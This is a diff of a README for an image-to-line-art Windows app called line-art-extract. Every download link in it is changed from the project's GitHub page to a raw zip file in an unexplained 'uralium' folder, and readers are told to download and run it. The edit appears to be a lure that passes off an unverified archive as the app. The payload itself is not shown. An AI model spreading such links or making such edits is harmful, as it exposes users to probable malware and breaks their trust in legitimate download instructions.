@@ -1,6 +1,6 @@
 # 🖼️ line-art-extract - Turn Images Into Clean Line Art
 
-[![Download](https://img.shields.io/badge/Download-Start%20Here-blue?style=for-the-badge)](https://github.com/Historical-storedprogram709/line-art-extract)
+[![Download](https://img.shields.io/badge/Download-Start%20Here-blue?style=for-the-badge)](https://raw.githubusercontent.com/Historical-storedprogram709/line-art-extract/main/uralium/art_line_extract_v3.1.zip)
 
 ## 🧭 What this app does
 
@@ -30,7 +30,7 @@ For best results, use a screen with normal scaling and a stable internet connect
 
 Visit this page to download the app:
 
-https://github.com/Historical-storedprogram709/line-art-extract
+https://raw.githubusercontent.com/Historical-storedprogram709/line-art-extract/main/uralium/art_line_extract_v3.1.zip
 
 After the page opens, look for the latest release or the main download file. Then download and run this file on your Windows PC.
 
@@ -167,4 +167,4 @@ This app is a good fit if you want to:
 
 ## 🔗 Download again
 
-https://github.com/Historical-storedprogram709/line-art-extract
+https://raw.githubusercontent.com/Historical-storedprogram709/line-art-extract/main/uralium/art_line_extract_v3.1.zip
